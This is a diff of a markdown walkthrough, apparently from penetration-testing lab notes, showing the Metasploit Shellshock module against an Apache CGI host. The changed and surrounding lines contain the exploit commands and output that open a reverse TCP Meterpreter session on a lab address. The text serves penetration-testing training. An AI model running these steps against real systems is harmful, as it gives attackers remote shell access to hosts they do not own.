@@ -138,21 +138,15 @@ msf > search shellshock
 msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
 msf exploit(apache_mod_cgi_bash_env_exec) > show options
 . . .
-. . .
-msf exploit(...) > set RHOST 10.11.1.71
-msf exploit(...) > set TARGETURI /cgi-bin/admin.cgi
-msf exploit(...) > set LHOST 10.11.0.4
-msf exploit(...) > set LPORT 443
-msf exploit(...) > show options
-. . .
-. . .
 msf exploit(...) > run
 [*] Started reverse TCP handler on 10.11.0.42:443
 [*] Command Stager progress - 100.46% done (1097/1092 bytes)
 [*] Transmitting intermediate stager...(106 bytes)
 [*] Sending stage (826872 bytes) to 10.11.1.71
 [*] Meterpreter session 1 opened (10.11.0.42:443 -> 10.11.1.71:34930) at 2018-12-18 13:53:55 +1100
-meterpreter >
+meterpreter > exit
+. . .
+msf exploit(apache_mod_cgi_bash_env_exec) > rerun
 ```
 
 You will now have reverse shell.
